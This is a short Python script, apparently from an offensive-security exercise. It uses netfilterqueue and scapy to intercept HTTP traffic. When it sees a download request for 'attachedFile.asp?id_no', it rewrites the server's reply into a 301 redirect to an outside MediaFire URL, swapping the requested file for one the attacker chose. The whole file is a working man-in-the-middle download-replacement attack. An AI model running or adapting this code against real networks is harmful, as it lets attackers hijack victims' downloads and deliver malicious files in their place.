import netfilterqueue
import scapy.all as scapy


ack_list = []


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    '''
        here we check if have http layer
        we do not know if have reqhttp / reshttp
        scapy work contain the main layer tcp udp ip
        and in the last the row data => http data and row layer
    '''
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            if "attachedFile.asp?id_no" in str(scapy_packet[scapy.Raw].load):
                print("[+] File Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                scapy_packet[scapy.Raw].load = 'HTTP/1.1 301 Moved Permanently\nLocation: http://download1083.mediafire.com/30chip39p7pg/seovws7ozer52um/file.txt\n\n'
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.TCP].chksum
                packet.set_payload(bytes(scapy_packet))
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
